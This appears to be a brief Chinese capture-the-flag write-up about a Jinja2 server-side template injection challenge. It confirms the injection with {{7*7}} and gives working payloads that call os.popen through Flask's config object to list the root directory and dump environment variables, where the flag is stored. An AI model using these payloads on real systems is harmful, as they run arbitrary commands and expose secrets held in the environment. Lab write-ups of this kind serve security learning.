## 渲染如呼吸一样简单
输入{{7*7}}返回49，判断为Jinja2模版注入，本题没有过滤  
```python
{{config.__class__.__init__.__globals__['os'].popen('ls /').read()}}
```
这里flag不在/flag目录，在环境变量里面  
```python
{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
```

## 
